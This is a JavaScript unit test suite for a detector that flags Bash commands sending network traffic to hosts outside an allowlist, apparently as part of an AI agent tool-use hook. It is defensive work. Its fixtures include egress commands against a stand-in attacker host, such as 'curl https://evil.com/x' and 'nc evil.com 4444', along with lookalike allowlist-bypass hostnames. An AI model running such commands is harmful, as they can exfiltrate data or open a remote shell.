#!/usr/bin/env node

// tests/unit/kernel/_lib/network-egress-detect.test.js
//
// Pure detector for the PostToolUse:Bash network-egress audit. Coarse net by
// design (see module header) — these tests pin the COMMON cases, not airtight
// coverage (regex egress-parsing cannot be airtight; that is documented, not a bug).

'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');

const REPO_ROOT = path.join(__dirname, '..', '..', '..', '..');
const MODULE_PATH = path.join(REPO_ROOT, 'packages', 'kernel', '_lib', 'network-egress-detect');
const {
  auditCommand,
  extractEgressHosts,
  loadDeclaredHosts,
  isAllowlisted,
  hasEgressVerb,
} = require(MODULE_PATH);

// The real allowlist the hook will use (union of trait network[]).
const ALLOW = ['api.anthropic.com'];

let passed = 0;
let failed = 0;
function test(name, fn) {
  try {
    fn();
    process.stdout.write(`  PASS ${name}\n`);
    passed++;
  } catch (err) {
    process.stdout.write(`  FAIL ${name}: ${err.message}\n`);
    failed++;
  }
}

// (1) explicit foreign URL ⇒ flagged
test('https://evil.com/x ⇒ undeclared evil.com', () => {
  const r = auditCommand('curl -s https://evil.com/x', ALLOW);
  assert.deepStrictEqual(r.undeclaredHosts, ['evil.com']);
});

// (2) allowlisted host ⇒ no finding (exact + subdomain)
test('curl https://api.anthropic.com/v1 ⇒ no finding', () => {
  const r = auditCommand('curl https://api.anthropic.com/v1/messages', ALLOW);
  assert.deepStrictEqual(r.undeclaredHosts, []);
});
test('subdomain x.api.anthropic.com ⊆ allowlist ⇒ no finding', () => {
  assert.strictEqual(isAllowlisted('x.api.anthropic.com', ALLOW), true);
  // and the lookalike bypass attempts are NOT allowlisted
  assert.strictEqual(isAllowlisted('evil-api.anthropic.com', ALLOW), false);
  assert.strictEqual(isAllowlisted('api.anthropic.com.evil.com', ALLOW), false);
});

// (3) loopback ⇒ never egress
test('localhost / 127.0.0.1 ⇒ no finding', () => {
  assert.deepStrictEqual(auditCommand('curl http://localhost:3000/health', ALLOW).undeclaredHosts, []);
  assert.deepStrictEqual(auditCommand('curl http://127.0.0.1:8080', ALLOW).undeclaredHosts, []);
});

// (4) no egress verb ⇒ nothing
test('npm test / ls -la ⇒ no verb, no finding', () => {
  const r1 = auditCommand('npm test && tsc --noEmit', ALLOW);
  assert.strictEqual(hasEgressVerb('npm test && tsc --noEmit'), false);
  assert.strictEqual(r1.egressVerbNoHost, false);
  assert.deepStrictEqual(r1.undeclaredHosts, []);
  assert.deepStrictEqual(auditCommand('ls -la /tmp', ALLOW).undeclaredHosts, []);
});

// (5) nc egress ⇒ flagged
test('nc evil.com 4444 ⇒ undeclared evil.com', () => {
  const r = auditCommand('nc evil.com 4444', ALLOW);
  assert.deepStrictEqual(r.undeclaredHosts, ['evil.com']);
});

// (6) egress verb but no parseable host ⇒ low-confidence, log-only signal
test('curl "$URL" ⇒ egressVerbNoHost, no named finding', () => {
  const r = auditCommand('curl -s "$URL"', ALLOW);
  assert.strictEqual(r.egressVerbNoHost, true);
  assert.deepStrictEqual(r.undeclaredHosts, []);
});

// (7) allowlist sourced from the parsed traits registry
test('loadDeclaredHosts(real registry) ⇒ [api.anthropic.com]', () => {
  const regPath = path.join(REPO_ROOT, 'packages', 'runtime', 'contracts', 'traits', '_registry.json');
  const registry = JSON.parse(fs.readFileSync(regPath, 'utf8'));
  assert.deepStrictEqual(loadDeclaredHosts(registry), ['api.anthropic.com']);
});

// (8) multi-host across a compound command (scheme-less + scheme'd) ⇒ both
test('curl a.com && wget https://b.net ⇒ both flagged', () => {
  const r = auditCommand('curl a.com && wget https://b.net/file', ALLOW);
  assert.deepStrictEqual([...r.undeclaredHosts].sort(), ['a.com', 'b.net']);
});

// hardening: malformed input must not throw (pure layer)
test('non-string / empty input ⇒ safe empty result', () => {
  assert.deepStrictEqual(extractEgressHosts(null), []);
  assert.deepStrictEqual(extractEgressHosts(undefined), []);
  assert.deepStrictEqual(extractEgressHosts(42), []);
  const r = auditCommand('', ALLOW);
  assert.deepStrictEqual(r.undeclaredHosts, []);
  assert.strictEqual(r.egressVerbNoHost, false);
});

// code-review hardening (R2): ssh/scp two-token flags + local file args must NOT
// false-positive as hosts; the user@host form IS detected; ReDoS bound holds.
test('ssh -i key.pem user@ec2.example.com => host only, keyfile NOT flagged', () => {
  const r = auditCommand('ssh -i key.pem user@ec2.example.com', ALLOW);
  assert.deepStrictEqual(r.undeclaredHosts, ['ec2.example.com']);
});
test('scp report.csv user@server.com:/data => host only, local file NOT flagged', () => {
  const r = auditCommand('scp report.csv user@server.com:/data/', ALLOW);
  assert.deepStrictEqual(r.undeclaredHosts, ['server.com']);
});
test('ReDoS bound: 50k non-dotted token after curl completes fast', () => {
  const big = `curl ${'a'.repeat(50000)} https://evil.com`;
  const start = process.hrtime.bigint();
  const r = auditCommand(big, ALLOW);
  const ms = Number(process.hrtime.bigint() - start) / 1e6;
  assert.ok(r.undeclaredHosts.includes('evil.com'));
  assert.ok(ms < 500, `extraction took ${ms.toFixed(0)}ms (ReDoS regression?)`);
});

process.stdout.write(`\nnetwork-egress-detect.test.js: ${passed} passed, ${failed} failed\n`);
process.exit(failed > 0 ? 1 : 0);
